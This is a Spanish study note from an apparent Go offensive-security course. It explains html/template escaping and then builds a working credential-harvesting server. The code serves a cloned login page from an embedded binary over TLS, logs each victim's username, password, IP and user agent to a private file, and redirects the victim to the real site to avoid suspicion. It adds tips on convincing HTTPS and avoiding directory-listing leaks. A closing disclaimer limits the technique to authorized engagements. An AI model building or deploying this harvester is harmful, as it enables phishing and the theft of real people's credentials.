---
tags:
  - Go
  - Go/HTTP
  - Phishing
Descripción: "Generar HTML dinámico de forma segura (html/template) y aplicarlo al ataque estrella del capítulo: el credential harvesting — clonar una página de login, servírsela a la víctima…"
Fecha de actualización: 2026-07-24
Nota previa: "[[01 - Middleware - el patrón de envoltura]]"
Nota siguiente: "[[03 - Keylogging con WebSockets]]"
Area: "[[Servidores HTTP.base|Servidores HTTP]]"
---
---

Generar HTML dinámico de forma segura (`html/template`) y aplicarlo al ataque estrella del capítulo: el **credential harvesting** — clonar una página de login, servírsela a la víctima y capturar lo que teclea. Go es ideal para esto: levantas un servidor en minutos, parseas la entrada del usuario sin esfuerzo y lo compilas en un binario que dejas caer donde quieras. La técnica de pentest (pretexto, señuelo, entrega) vive en Red Team; aquí, la construcción en Go.

## `html/template`: auto-escaping contextual

Go trae dos paquetes de plantillas: `text/template` y `html/template`. <mark style="background: #FF5582A6;">Para cualquier cosa que sirvas a un navegador, **siempre** `html/template`</mark>: escapa automáticamente los datos que interpolas, neutralizando XSS en tus propias herramientas.

```go
t := template.Must(template.New("page").Parse(`<p>Hola {{.}}</p>`))
t.Execute(w, "<script>alert(1)</script>")
// salida: <p>Hola &lt;script&gt;alert(1)&lt;/script&gt;</p>  -> el script NO se ejecuta
```

Lo potente es que el escapado es **contextual**: <mark style="background: #ADCCFFA6;">el mismo dato se codifica distinto según dónde caiga</mark> — como texto HTML en el cuerpo, URL-encoded dentro de un `href`, escapado como JS dentro de un `<script>`. Los marcadores `{{.}}` (todo el contexto) o `{{.Campo}}` (un campo del struct) inyectan los datos. `text/template` **no** escapa nada — usarlo para HTML es un XSS servido en bandeja.

> [!warning]+ El auto-escaper es seguro, pero no infalible: mantén Go parcheado
> `html/template` neutraliza la inmensa mayoría de los XSS, pero su escaper ha tenido varios **bypasses** corregidos vía CVE (CVE-2023-24538 con template literals de JS; y en 2026, CVE-2026-27142 y CVE-2026-39826, parcheados en **Go 1.26.1 / 1.25.8**). La lección para cualquier frontend que expongas —un panel de C2, una web de tooling— es que `html/template` **no sustituye** a mantener el toolchain actualizado. Fuente: [go.dev/doc/security](https://go.dev/security).

## El servidor de credential harvesting

El ataque: sirves una copia de una página de login legítima, pero con el `action` del formulario apuntando a **tu** servidor. La víctima teclea sus credenciales, tú las capturas y la rediriges a la web real para que no sospeche.

```html
<!-- en la página clonada, cambias esto: -->
<form method="post" action="https://webmail.target.com/login">
<!-- por esto: -->
<form method="post" action="/login">
```

El servidor sirve los archivos estáticos de la página y captura el POST del formulario con `r.FormValue`:

```go
func login(w http.ResponseWriter, r *http.Request) {
    slog.Info("credencial capturada",
        "user", r.FormValue("_user"),      // el name= del input de usuario en la página clonada
        "pass", r.FormValue("_pass"),
        "ip", r.RemoteAddr, "ua", r.UserAgent())
    http.Redirect(w, r, "https://webmail.target.com/", http.StatusFound)  // a la web real
}
```

## Modernizar: el harvester en un solo binario con `//go:embed`

El libro deja la página clonada en una carpeta `public/` en disco y la sirve con `http.FileServer(http.Dir("public"))`. Eso obliga a desplegar el binario **y** su carpeta de archivos. La modernización: <mark style="background: #8000E1A6;">`//go:embed` incrusta la página entera dentro del binario</mark> en compilación, y `http.FileServerFS` (Go 1.22) la sirve desde ahí. Un único archivo autocontenido que copias y ejecutas:

```go
//go:embed public
var siteFS embed.FS

func main() {
    fh, _ := os.OpenFile("creds.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)  // solo tú lo lees
    slog.SetDefault(slog.New(slog.NewJSONHandler(fh, nil)))

    sub, _ := fs.Sub(siteFS, "public")          // el subdirectorio embebido como fs.FS
    mux := http.NewServeMux()
    mux.HandleFunc("POST /login", login)         // captura (routing 1.22, nota 00)
    mux.Handle("GET /", http.FileServerFS(sub))  // sirve la página clonada desde el binario

    srv := &http.Server{Addr: ":8443", Handler: mux, ReadHeaderTimeout: 5 * time.Second}
    log.Fatal(srv.ListenAndServeTLS("cert.pem", "key.pem"))
}
```

## Detalles que importan

- **HTTPS creíble**: `ListenAndServeTLS` con un certificado de Let's Encrypt para el dominio de tu pretexto. Sin candado, muchas víctimas (y navegadores) desconfían.
- **Fichero de credenciales `0600`**: solo tu usuario lo lee. `slog` con `JSONHandler` deja cada captura como una línea JSON parseable.
- **Redirect a la web real** tras capturar: la víctima "falla" el login una vez, aterriza en el sitio auténtico y lo achaca a un typo.
- **Fuga por directory-index**: <mark style="background: #FFB86CA6;">`http.FileServer`/`FileServerFS` listan el contenido del directorio si no hay `index.html`</mark>, revelando tu estructura de archivos. Asegura un `index.html`, o envuelve el `fs.FS` para denegar el listado.

> [!warning]+ Alcance y autorización
> El credential harvesting solo es legítimo dentro de un engagement **autorizado por escrito** (con scope y reglas de enfrentamiento claras). La ingeniería social real, los pretextos y la infraestructura de phishing (dominios, certificados, evasión de filtros de correo) son metodología de Red Team, no de este curso de Go.

La variante en tiempo real de este ataque no espera a que la víctima envíe el formulario: captura cada tecla según se pulsa, con un keylogger sobre WebSockets → [[03 - Keylogging con WebSockets]].
